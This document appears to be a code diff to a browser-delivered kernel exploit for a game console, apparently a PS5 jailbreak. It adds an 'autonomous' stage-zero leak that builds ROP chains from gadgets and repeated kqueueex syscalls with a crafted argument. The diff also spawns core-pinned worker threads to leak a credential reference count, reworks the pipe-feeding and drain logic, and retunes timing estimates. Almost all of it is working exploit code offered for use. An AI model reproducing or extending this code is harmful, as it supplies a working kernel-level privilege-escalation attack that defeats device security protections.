@@ -130,18 +130,16 @@
         // Still 3x p2jb's original 64 and still ONE fireSync wake, which is what keeps the
         // free and the spray on the same core.
         const NUM_IPV6_SOCKETS = 192;
-        // FAST (default): matem6 4 leak cores + pinned aggressive feed + 16384 unroll.
-        // Avoids 5-core ~4MB ROP chains + full pipe prefills that OOM WebKit on PS5.
-        // ?cores=5: experimental 5th core (~38 min if stable; may OOM on some units).
-        // ?cores=4 / ?pf=1: conservative. ?pp=1: debug burst (may hang).
+        // P2JB-2 (default): autonomous counter-driven cr_ref leak — no pipes, no JS feed.
+        // Same kqueueex bug, stage0 rewritten as a self-driving kernel exploit.
+        // ?legacy=1 / ?pf=1: matem6 pipe-gated leak. ?cores=5: 5 workers @8192 unroll.
         let MAIN_CORE = 4;
         const MAIN_RTPRIO = 256;
         let LEAK_CORES = [0, 1, 2, 3];
-        const _use_pp_burst = /\bpp=1\b/.test(location.search);
-        const _pipe_feed_legacy = /\bpf=1\b/.test(location.search);
-        const _force_4core = /\bcores=4\b/.test(location.search);
+        const _legacy_pipe = /\blegacy=1\b/.test(location.search) || /\bpf=1\b/.test(location.search);
+        const _pipe_feed_legacy = _legacy_pipe;
         const _want_5core = /\bcores=5\b/.test(location.search);
-        const _fast35 = !_use_pp_burst && !_pipe_feed_legacy && !_force_4core;
+        const _use_prefill = !_legacy_pipe;
         (function planCores() {
             const a = window.P2JB_ALLOWED_CORES;
             if (!Array.isArray(a) || a.length < 3) return;
@@ -151,6 +149,162 @@
             else
                 LEAK_CORES = a.slice(0, a.length - 2);
         })();
+
+        function require_p2jb2_gadgets() {
+            for (const g of ["cmp_rcx_eax", "sete_al", "shl_rax_3", "add_rax_rcx",
+                "mov_rax_indir", "inc_dword_rax"]) {
+                if (!ROP[g]) fail("p2jb2: ROP." + g + " missing — use ?legacy=1");
+            }
+        }
+
+        // poops G_BRANCH: [counter]==imm → exit, else work.
+        function emit_branch_equal(emit, at, idx, branch_tbl, val_addr, cmp_imm, work_rsp, exit_rsp) {
+            write64(branch_tbl + 0n, work_rsp);
+            write64(branch_tbl + 8n, exit_rsp);
+            emit(ROP.pop_rcx); emit(val_addr);
+            emit(ROP.pop_rax); emit(cmp_imm);
+            emit(ROP.cmp_rcx_eax);
+            emit(ROP.pop_rax); emit(0n);
+            emit(ROP.sete_al);
+            emit(ROP.shl_rax_3);
+            emit(ROP.pop_rcx); emit(branch_tbl);
+            emit(ROP.add_rax_rcx);
+            emit(ROP.mov_rax_indir);
+            const bptr_ptr_idx = idx;
+            emit(ROP.pop_rdi); emit(0n);
+            emit(ROP.mov_qword_rdi_rax);
+            emit(ROP.pop_rsp);
+            const bptr_slot = idx;
+            emit(0n);
+            write64(at(bptr_ptr_idx + 1), at(bptr_slot));
+            return idx;
+        }
+
+        async function build_p2jb2_leak_chain(core, counter_addr, loops_target, finished_addr, unroll, remainder) {
+            require_p2jb2_gadgets();
+            const POC_ARG = 0x800000000000n;
+            const EXIT_MARK = 0xDEADn;
+            const BRANCH_SLOTS = 18;
+            const STACK_SIZE = 0x4000 + (unroll * 27 + remainder * 6 + BRANCH_SLOTS + 0x400) * 8;
+            const buf = malloc(STACK_SIZE);
+            for (let k = 0n; k < 0x4000n; k += 8n) write64(buf + k, 0n);
+            const entry = buf + 0x4000n;
+            const branch_tbl = malloc(16);
+            const mask = malloc(0x10);
+            write64(mask + 0x0n, 1n << BigInt(core));
+            write64(mask + 0x8n, 0n);
+
+            let idx = 0;
+            const emit = (v) => { write64(entry + BigInt(idx * 8), v); idx++; return idx - 1; };
+            const at = (i) => entry + BigInt(i * 8);
+
+            emit(ROP.ret); emit(ROP.ret);
+            emit(ROP.pop_rax); emit(SYSCALL.cpuset_setaffinity);
+            emit(ROP.pop_rdi); emit(3n);
+            emit(ROP.pop_rsi); emit(1n);
+            emit(ROP.pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
+            emit(ROP.pop_rcx); emit(0x10n);
+            emit(ROP.pop_r8); emit(mask);
+            emit(syscall_wrapper); emit(ROP.ret);
+
+            const LOOP_START = idx;
+            const BRANCH_SLOTS = 18;
+            const work_idx = idx + BRANCH_SLOTS;
+            const exit_idx = work_idx + unroll * 21 + 8;
+            emit_branch_equal(emit, at, idx, branch_tbl, counter_addr, loops_target,
+                at(work_idx), at(exit_idx));
+
+            const kqBase = [];
+            for (let k = 0; k < unroll; k++) {
+                kqBase.push(idx);
+                emit(ROP.pop_rax); emit(SYSCALL.kqueueex);
+                emit(ROP.pop_rdi); emit(POC_ARG);
+                emit(syscall_wrapper); emit(ROP.ret);
+                if (k > 0 && (k & 2047) === 0) await js_sleep(0);
+            }
+            const repairSlot = (s, v) => {
+                emit(ROP.pop_rdi); emit(at(s));
+                emit(ROP.pop_rax); emit(v);
+                emit(ROP.mov_qword_rdi_rax);
+            };
+            for (let k = 0; k < unroll; k++) {
+                const b = kqBase[k];
+                repairSlot(b + 0, ROP.pop_rax);
+                repairSlot(b + 1, SYSCALL.kqueueex);
+                repairSlot(b + 2, ROP.pop_rdi);
+                repairSlot(b + 3, POC_ARG);
+                repairSlot(b + 4, syscall_wrapper);
+            }
+            emit(ROP.pop_rax); emit(1n);
+            emit(ROP.pop_rdi); emit(finished_addr);
+            emit(ROP.mov_qword_rdi_rax);
+            emit(ROP.pop_rax); emit(counter_addr);
+            emit(ROP.inc_dword_rax);
+            emit(ROP.pop_rsp);
+            const PIVOT = idx; emit(at(LOOP_START));
+
+            if (idx % 2 !== 0) emit(ROP.ret);
+            const EXIT = idx;
+            for (let k = 0; k < remainder; k++) {
+                emit(ROP.pop_rax); emit(SYSCALL.kqueueex);
+                emit(ROP.pop_rdi); emit(POC_ARG);
+                emit(syscall_wrapper); emit(ROP.ret);
+            }
+            emit(ROP.pop_rax); emit(EXIT_MARK);
+            emit(ROP.pop_rdi); emit(finished_addr);
+            emit(ROP.mov_qword_rdi_rax);
+            emit(ROP.pop_rax); emit(SYSCALL.thr_exit);
+            emit(ROP.pop_rdi); emit(0n);
+            emit(syscall_wrapper);
+
+            return { entry, pivotAddr: at(PIVOT), exitAddr: at(EXIT) };
+        }
+
+        async function run_p2jb2_crref_leak(TOTAL_SYSCALLS, LEAK_UNROLL, U, NW, leak_mode) {
+            window.syncMark("P2JB2-ENTER", "autonomous leak cores=" + NW + " unroll=" + LEAK_UNROLL);
+            const base_share = TOTAL_SYSCALLS / BigInt(NW);
+            const extra0 = TOTAL_SYSCALLS - base_share * BigInt(NW);
+            const workers = [];
+            for (let w = 0; w < NW; w++) {
+                const target_w = base_share + (w === 0 ? extra0 : 0n);
+                const loops_w = target_w / U;
+                const remainder_w = Number(target_w - loops_w * U);
+                const counter = malloc(4); write32(counter, 0n);
+                const finished = malloc(8); write64(finished, 0n);
+                const chain = await build_p2jb2_leak_chain(
+                    LEAK_CORES[w], counter, loops_w, finished, LEAK_UNROLL, remainder_w);
+                await js_sleep(0);
+                await ulog("P2JB2-SPAWN-" + w + " loops=" + loops_w + " rem=" + remainder_w);
+                spawn_leak_worker(chain.entry);
+                workers.push({ chain, counter, finished, loops: loops_w, target: target_w });
+            }
+            const total_loops = workers.reduce((a, w) => a + w.loops, 0n);
+            window.liveStatus("P2JB-2 autonomous leak\n" + NW + " workers, " + LEAK_UNROLL
+                + "x, no pipes", 0, "leak");
+            let liveMs = 0;
+            while (true) {
+                let done_loops = 0n, all_exit = true;
+                for (const w of workers) {
+                    done_loops += read32(w.counter) & 0xFFFFFFFFn;
+                    if (read64(w.finished) !== 0xDEADn) all_exit = false;
+                }
+                const pct = total_loops > 0n
+                    ? Number((done_loops * 10000n) / total_loops) / 100 : 0;
+                const now = Date.now();
+                if (now - liveMs >= 1000) {
+                    liveMs = now;
+                    window.liveStatus(
+                        "P2JB-2 cr_ref leak (" + leak_mode + ")\nloops "
+                        + done_loops + " / " + total_loops + " = "
+                        + (done_loops * U) + " kqueueex",
+                        pct, "leak");
+                }
+                if (all_exit) break;
+                await js_sleep(100);
+            }
+            window.liveStatus("P2JB-2 leak complete", 100, "leak");
+            return workers;
+        }
 
         async function pipe_fill_burst(wfd, count, buf, chunk) {
             let left = count;
@@ -448,7 +602,7 @@
         // is not how elfldr is started on 12.00 - see the KEXP HANDOFF block below - so the
         // chain, and the three spawn variants built around it, are gone with it.
 
-        function build_leak_worker_chain(core, pipe_rfd, finished_addr, dummybuf, unroll, remainder) {
+        async function build_leak_worker_chain(core, pipe_rfd, finished_addr, dummybuf, unroll, remainder) {
             const POC_ARG = 0x800000000000n;
             const EXIT_MARK = 0xDEADn;
             const STACK_SIZE = 0x4000 + (unroll * 31 + remainder * 6 + 0x200) * 8;
@@ -492,6 +646,7 @@
                 emit(ROP.pop_rdi); emit(POC_ARG);
                 emit(syscall_wrapper);
                 emit(ROP.ret);
+                if (k > 0 && (k & 2047) === 0) await js_sleep(0);
             }
 
             const repairSlot = (slotIdx, value) => {
@@ -515,6 +670,7 @@
                 repairSlot(b + 2, ROP.pop_rdi);
                 repairSlot(b + 3, POC_ARG);
                 repairSlot(b + 4, syscall_wrapper);
+                if (k > 0 && (k & 2047) === 0) await js_sleep(0);
             }
 
             emit(ROP.pop_rax); emit(1n);
@@ -905,9 +1061,10 @@
         async function setup_workers(S) {
             window.syncMark("SETUP-WORKERS-ENTER", "iov=" + IOV_THREAD_NUM + " uio=" + UIO_THREAD_NUM);
             window.liveStatus("cores: leak=[" + LEAK_CORES.join(",") + "] exec=" + MAIN_CORE
-                + (_use_pp_burst ? " (pp)" : _pipe_feed_legacy ? " (pf)"
-                    : _want_5core ? " (5-core)" : " (fast)")
-                + "\nSETUP - spawning " + (IOV_THREAD_NUM + UIO_THREAD_NUM * 2) + " racer threads (thr_new)");
+                + (_legacy_pipe ? " (legacy)" : " (p2jb2)")
+                + (_want_5core ? " 5-core" : "")
+                + "\nSETUP - spawning " + (IOV_THREAD_NUM + UIO_THREAD_NUM * 2) + " racer threads (thr_new)",
+                null, "setup");
             S.iov_ws = make_worker_sync(IOV_THREAD_NUM);
             S.uio_read_ws = make_worker_sync(UIO_THREAD_NUM);
             S.uio_write_ws = make_worker_sync(UIO_THREAD_NUM);
@@ -924,7 +1081,7 @@
                 if (i === 0) { await js_sleep(500); window.syncMark("IOV-0-ALIVE", "main survived 500ms after first racer spawn"); }
             }
             window.syncMark("SETUP-WORKERS-DONE", "all racers spawned");
-            window.liveStatus("SETUP - racer threads up. building leak chains...");
+            window.liveStatus("SETUP - racer threads up. building leak chains...", null, "setup");
             for (let i = 0; i < UIO_THREAD_NUM; i++) {
                 const ch = build_worker_chain(
                     S.uio_read_ws, i, S.uio_sock_b, S.uio_iov_read, SYSCALL.writev,
@@ -1585,24 +1742,33 @@
 
             const POC_ARG = 0x800000000000n;
             const EXIT_MARK = 0xDEADn;
-            const LEAK_UNROLL = _pipe_feed_legacy ? 4096 : 16384;
+            const LEAK_UNROLL = _legacy_pipe
+                ? (_pipe_feed_legacy ? 4096 : (_want_5core ? 8192 : 16384))
+                : (_want_5core ? 8192 : 16384);
             const U = BigInt(LEAK_UNROLL);
-            const FEED_CHUNK = _pipe_feed_legacy ? 4096 : 16384;
+            const FEED_CHUNK = _pipe_feed_legacy ? 4096 : 65536;
             const PIPE_ROOM = 57344n;
-            const FEED_IDLE_MS = _pipe_feed_legacy ? 500 : 100;
-            const leak_mode = _use_pp_burst ? "pp" : (_pipe_feed_legacy ? "pf"
-                : (_want_5core ? "5c" : "fast"));
+            const FEED_IDLE_MS = _pipe_feed_legacy ? 500 : 50;
+            const POLL_MS = 100;
+            const leak_mode = _legacy_pipe
+                ? (_use_prefill ? "legacy-turbo" : "legacy-feed")
+                : (_want_5core ? "p2jb2-5" : "p2jb2");
             window.syncMark("LEAK-MODE", leak_mode + " unroll=" + LEAK_UNROLL
                 + " cores=" + LEAK_CORES.length
-                + (_want_5core ? " WARN=5core-OOM-risk" : ""));
+                + (_legacy_pipe ? " pipe=1" : " autonomous=1"));
 
-            if (_fast35) {
+            const NW = LEAK_CORES.length;
+
+            if (!_legacy_pipe) {
+                await run_p2jb2_crref_leak(TOTAL_SYSCALLS, LEAK_UNROLL, U, NW, leak_mode);
+            } else {
+
+            if (_pipe_feed_legacy) {
                 pin_to_core(MAIN_CORE);
-                window.syncMark("FAST35-PIN", "feed on core " + MAIN_CORE
+                window.syncMark("FEED-PIN", "legacy feed on core " + MAIN_CORE
                     + " cur=" + get_current_core());
             }
 
-            const NW = LEAK_CORES.length;
             const chunkbuf = malloc(FEED_CHUNK);
 
             const base_share = TOTAL_SYSCALLS / BigInt(NW);
@@ -1626,37 +1792,82 @@
                 syscall(SYSCALL.fcntl, BigInt(wfd), F_SETFL, O_NONBLOCK);
                 const finished = malloc(8); write64(finished, 0n);
                 const dummybuf = malloc(8);
-                const chain = build_leak_worker_chain(
+                const chain = await build_leak_worker_chain(
                     LEAK_CORES[w], rfd, finished, dummybuf, LEAK_UNROLL,
                     Number(remainder_w));
                 await js_sleep(0);
-                if (_use_pp_burst && normal_w > 65535n)
-                    fail("pp: normal_w=" + normal_w + " > pipe cap");
+                if (_use_prefill && normal_w > 65535n)
+                    fail("turbo: normal_w=" + normal_w + " > pipe cap 65535");
                 await ulog("SPAWN-" + w + "-PRE core=" + LEAK_CORES[w] + " entry=" + toHex(chain.entry));
                 const _th = spawn_leak_worker(chain.entry);
-                if (_use_pp_burst)
+                if (_use_prefill) {
+                    await ulog("PREFILL-" + w + " bytes=" + normal_w);
                     await pipe_fill_burst(wfd, normal_w, chunkbuf, FEED_CHUNK);
+                }
                 await ulog("SPAWN-" + w + "-POST handle=" + toHex(_th));
-                await js_sleep(100);
+                await js_sleep(0);
                 await ulog("SPAWN-" + w + "-ALIVE main survived after worker " + w);
                 const pendbuf = malloc(4); write32(pendbuf, 0n);
                 lws.push({
                     chain, rfd, wfd, finished, pendbuf,
-                    normal: normal_w, queued: 0n
+                    normal: normal_w, queued: _use_prefill ? normal_w : 0n
                 });
             }
             await ulog("SPAWN-DONE all " + NW + " workers spawned, entering leak");
             window.liveStatus("STAGE 0 - leak workers up"
-                + (_use_pp_burst ? ", pp burst" : ", feeding pipes"), 0);
+                + (_use_prefill ? ", pipes prefilled" : ", feeding pipes"), 0, "leak");
 
             const total_need = lws.reduce((a, l) => a + l.normal, 0n);
             let feedLiveMs = 0;
 
-            if (_use_pp_burst) {
+            async function report_drain(lws, total_need, U, NW, LEAK_UNROLL, leak_mode, label) {
+                let drainLiveMs = 0;
+                let drain0 = 0n;
+                for (const l of lws) {
+                    write32(l.pendbuf, 0n);
+                    const r = syscall(SYSCALL.ioctl, BigInt(l.rfd), FIONREAD, l.pendbuf);
+                    if ((r & 0xFFFFFFFFn) === 0n)
+                        drain0 += read32(l.pendbuf) & 0xFFFFFFFFn;
+                }
+                if (drain0 <= 0n) drain0 = 1n;
+                window.liveStatus(label + " - draining worker pipes\n"
+                    + "in-pipe " + drain0 + " bytes left", 0, "drain");
+                for (let di = 0; di < lws.length; di++) {
+                    const lw = lws[di];
+                    while (true) {
+                        write64(lw.finished, 0n);
+                        await js_sleep(500);
+                        if (read64(lw.finished) === 0n) break;
+                        const now = Date.now();
+                        if (now - drainLiveMs >= 1000) {
+                            drainLiveMs = now;
+                            let pending = 0n, fioOK = true;
+                            for (const l of lws) {
+                                write32(l.pendbuf, 0n);
+                                const r = syscall(SYSCALL.ioctl, BigInt(l.rfd), FIONREAD, l.pendbuf);
+                                if ((r & 0xFFFFFFFFn) !== 0n) { fioOK = false; break; }
+                                pending += read32(l.pendbuf) & 0xFFFFFFFFn;
+                            }
+                            if (!fioOK) pending = 0n;
+                            let pct = Number(((drain0 - pending) * 10000n) / drain0) / 100;
+                            if (pct < 0) pct = 0;
+                            if (pct > 100) pct = 100;
+                            window.liveStatus(
+                                label + " (" + NW + " cores, " + LEAK_UNROLL + "x, " + leak_mode + ")\n"
+                                + "draining pipes  worker " + (di + 1) + "/" + lws.length
+                                + "  in-pipe " + pending + " / " + drain0,
+                                pct, "drain");
+                        }
+                    }
+                }
+                window.liveStatus(label + " - pipe drain complete", 100, "drain");
+            }
+
+            if (_use_prefill) {
             for (const lw of lws) lw.queued = lw.normal;
-            let pp_done = false;
-            while (!pp_done) {
-                pp_done = true;
+            let poll_done = false;
+            while (!poll_done) {
+                poll_done = true;
                 let pending = 0n, fioOK = true;
                 for (const l of lws) {
                     write32(l.pendbuf, 0n);
@@ -1666,31 +1877,27 @@
                 }
                 if (!window.__fioMarked) {
                     window.__fioMarked = 1;
-                    window.syncMark("FIONREAD", "ok=" + fioOK + " pending=" + pending + " mode=pp");
+                    window.syncMark("FIONREAD", "ok=" + fioOK + " pending=" + pending
+                        + " mode=" + leak_mode);
                 }
                 if (!fioOK) pending = 0n;
-                if (pending > 0n) pp_done = false;
+                if (pending > 0n) poll_done = false;
                 const done_b = total_need > pending ? total_need - pending : total_need;
                 const pct = Number((done_b * 10000n) / total_need) / 100;
                 const now = Date.now();
                 if (now - feedLiveMs >= 1000) {
                     feedLiveMs = now;
                     window.liveStatus(
-                        "STAGE 0 - cr_ref leak (" + NW + " cores, " + LEAK_UNROLL + "x, pp)\n"
+                        "STAGE 0 - cr_ref leak (" + NW + " cores, " + LEAK_UNROLL + "x, "
+                        + leak_mode + ")\n"
                         + "consumed " + done_b + " / " + total_need + " = "
                         + (done_b * U) + " kqueueex  in-pipe " + pending,
                         pct, "leak");
                 }
-                if (!pp_done) await js_sleep(500);
+                if (!poll_done) await js_sleep(POLL_MS);
             }
-            for (let di = 0; di < lws.length; di++) {
-                const lw = lws[di];
-                while (true) {
-                    write64(lw.finished, 0n);
-                    await js_sleep(500);
-                    if (read64(lw.finished) === 0n) break;
-                }
-            }
+            await report_drain(lws, total_need, U, NW, LEAK_UNROLL, leak_mode,
+                "STAGE 0 - cr_ref leak");
             } else {
             let all_fed = false;
             while (!all_fed) {
@@ -1712,7 +1919,7 @@
                     if (lw.queued >= lw.normal) continue;
                     all_fed = false;
                     let want = lw.normal - lw.queued;
-                    if (_fast35 && fioOK) {
+                    if (_pipe_feed_legacy && fioOK) {
                         const room = PIPE_ROOM - (pendings[i] || 0n);
                         if (room <= 0n) continue;
                         if (want > room) want = room;
@@ -1747,14 +1954,8 @@
                     else await js_sleep(FEED_IDLE_MS);
                 }
             }
-            for (let di = 0; di < lws.length; di++) {
-                const lw = lws[di];
-                while (true) {
-                    write64(lw.finished, 0n);
-                    await js_sleep(500);
-                    if (read64(lw.finished) === 0n) break;
-                }
-            }
+            await report_drain(lws, total_need, U, NW, LEAK_UNROLL, leak_mode,
+                "STAGE 0 - cr_ref leak");
             }
 
             for (const lw of lws) {
@@ -1785,6 +1986,8 @@
                 syscall(SYSCALL.close, BigInt(lw.rfd));
                 syscall(SYSCALL.close, BigInt(lw.wfd));
             }
+
+            } // _legacy_pipe
 
             // GROUND TRUTH. Every previous stage0 post-mortem re-derived the leak count from
             // the chain source; this reads it out of the kernel. executed == TOTAL_SYSCALLS
@@ -1820,7 +2023,7 @@
                     // ~5 chain slots per call => 700 calls/chain => 2.29M in ~3s.
                     let deficit = want - executed;
                     if (deficit > 0n) {
-                        const PER_CHAIN = 750;
+                        const PER_CHAIN = 1000;
                         const POC = 0x800000000000n;
                         const kqnum = Number(SYSCALL.kqueueex);
                         const t0 = Date.now();
@@ -4269,7 +4472,7 @@
 
         const leak_nw = LEAK_CORES.length;
         let eta_minutes;
-        if (_pipe_feed_legacy || _force_4core) {
+        if (_legacy_pipe) {
             switch (leak_nw) {
                 case 1: eta_minutes = 120; break;
                 case 2: eta_minutes = 75; break;
@@ -4277,39 +4480,48 @@
                 case 4: eta_minutes = 50; break;
                 default: eta_minutes = Math.max(25, Math.round(50 * 4 / leak_nw)); break;
             }
-        } else if (_use_pp_burst) {
+        } else if (_want_5core) {
             switch (leak_nw) {
-                case 4: eta_minutes = 42; break;
-                default: eta_minutes = Math.max(30, Math.round(42 * 4 / leak_nw)); break;
+                case 5: eta_minutes = 34; break;
+                default: eta_minutes = Math.max(28, Math.round(34 * 5 / leak_nw)); break;
             }
         } else {
             switch (leak_nw) {
-                case 1: eta_minutes = 100; break;
-                case 2: eta_minutes = 62; break;
-                case 3: eta_minutes = 48; break;
-                case 4: eta_minutes = 45; break;
-                case 5: eta_minutes = 38; break;
-                default: eta_minutes = Math.max(32, Math.round(45 * 4 / leak_nw)); break;
+                case 1: eta_minutes = 90; break;
+                case 2: eta_minutes = 55; break;
+                case 3: eta_minutes = 42; break;
+                case 4: eta_minutes = 36; break;
+                default: eta_minutes = Math.max(28, Math.round(36 * 4 / leak_nw)); break;
             }
         }
-        window.syncMark("LEAK-TUNE", "mode=" + (_use_pp_burst ? "pp"
-            : (_pipe_feed_legacy ? "pf" : (_want_5core ? "5c" : "fast")))
+        window.syncMark("LEAK-TUNE", "mode=" + (_legacy_pipe ? "legacy"
+            : (_want_5core ? "p2jb2-5" : "p2jb2"))
             + " cores=" + leak_nw + " unroll="
-            + (_pipe_feed_legacy ? 4096 : 16384) + " eta_min=" + eta_minutes);
+            + (_legacy_pipe && _pipe_feed_legacy ? 4096 : (_want_5core ? 8192 : 16384))
+            + " eta_min=" + eta_minutes);
+        if (typeof window.liveStatus.configure === "function") {
+            const leakSec = eta_minutes * 60;
+            window.liveStatus.configure({
+                leakSec,
+                drainSec: Math.max(120, Math.round(leakSec * 0.08))
+            });
+        }
+        const leakSec = eta_minutes * 60;
+        const drainSec = Math.max(120, Math.round(leakSec * 0.08));
+        const totalRunSec = 120 + leakSec + drainSec + 90 + 60 + 15 + 300;
+        const totalRunMin = Math.round(totalRunSec / 60);
         const eta_str = eta_minutes < 60
             ? "~" + eta_minutes + " min"
             : "~" + Math.floor(eta_minutes / 60) + "h" +
             (eta_minutes % 60 ? " " + (eta_minutes % 60) + " min" : "");
-
         const fmt_hm = d =>
             String(d.getHours()).padStart(2, '0') + ':' +
             String(d.getMinutes()).padStart(2, '0');
         const t_start = new Date();
-        const t_eta = new Date(t_start.getTime() + eta_minutes * 60000);
+        const t_eta = new Date(t_start.getTime() + totalRunMin * 60000);
         await ulog("host OK - starting " + leak_nw + "-core leak at " +
-            fmt_hm(t_start) + ", ETA stage0 ~" + fmt_hm(t_eta) +
-            " (" + eta_str + "); no further log output until then " +
-            "(this is normal, do not interrupt)");
+            fmt_hm(t_start) + ", ETA full run ~" + fmt_hm(t_eta) +
+            " (~" + totalRunMin + " min incl. race; leak ~" + eta_str + ")");
 
         await setup_workers(S);
         setup_ipv6_spray(S);
